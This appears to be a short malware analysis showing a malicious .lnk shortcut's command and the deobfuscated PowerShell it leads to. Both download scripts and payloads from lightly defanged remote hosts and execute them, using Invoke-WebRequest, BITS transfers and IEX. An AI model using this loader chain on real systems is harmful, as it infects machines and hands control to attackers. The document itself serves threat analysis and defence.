### Malicious Shortcut Doc065754.lnk executes the following command

```
"C:\WINDOWS\System32\WScript.exe" "\\localhost\c$\Windows\System32\SyncAppvPublishingServer.vbs" n;
Invoke-WebRequest http[:]//0xC2.11808979/sara/Vejlensisk90.vbs -OutFile C:\Windows\Tasks\Tepoler.vbs; 
C:\Windows\Tasks\Tepoler.vbs; 
Invoke-WebRequest http[:]//0xC2.11808979/sara/info.pdf -OutFile C:\Users\Public\info1.pdf; 
C:\Users\Public\info1.pdf
```

### Vejlensisk90.vbs executes the following Deobfuscated PS Script

```ps
Function StringReplace ([String]$Eddikeb){
	For($Modemets=1; $Modemets -lt $Eddikeb.Length-1; $Modemets+=(1+1)){
		$mdeaftens=$mdeaftens+$Eddikeb.Substring($Modemets, 1);};
	$mdeaftens;
}

$URL='http[:]//194.180.48[.]211/zara/Dedepseud52.toc';
$IEX=iex;
$PSPath = '\syswow64\WindowsPowerShell\v1.0\powershell.exe';
IEX $windirpath=$env:windir;
IEX $PSPath='C:\Windows\syswow64\WindowsPowerShell\v1.0\powershell.exe';
IEX $GetCurrentProcessPath = ((gwmi win32_process -F ProcessId=${PID}).CommandLine) -split '"';
IEX $CleanArrayofPath = $GetCurrentProcessPath[$GetCurrentProcessPath.count-2];
IEX $Model=(Test-Path $PSPath) -And ([IntPtr]::size -eq 8);

if ($Model) {
	.$PSPath $CleanArrayofPath;
} else {
	$BitsTransfer=Start-BitsTransfer -Source $URL -Destination $FileOutPut;
	IEX $FileOutPut=$env:appdata ;
	IEX Import-Module BitsTransfer;
	$windirpath=$windirpath+'\Raao.pal';

	while (-not $Ifpathexists) {
		IEX $Ifpathexists=(Test-Path $FileOutPut);
		IEX $BitsTransfer;
		IEX Start-Sleep 5;
	}
	IEX $FileData = Get-Content $FileOutPut;
	IEX $Base64Decoded = [System.Convert]::FromBase64String($FileData);
	IEX $ByteArray = [System.Text.Encoding]::ASCII.GetString($Base64Decoded);
	IEX $vbscript=$ByteArray.substring(188264,19335);
	IEX $vbscript;
}
```
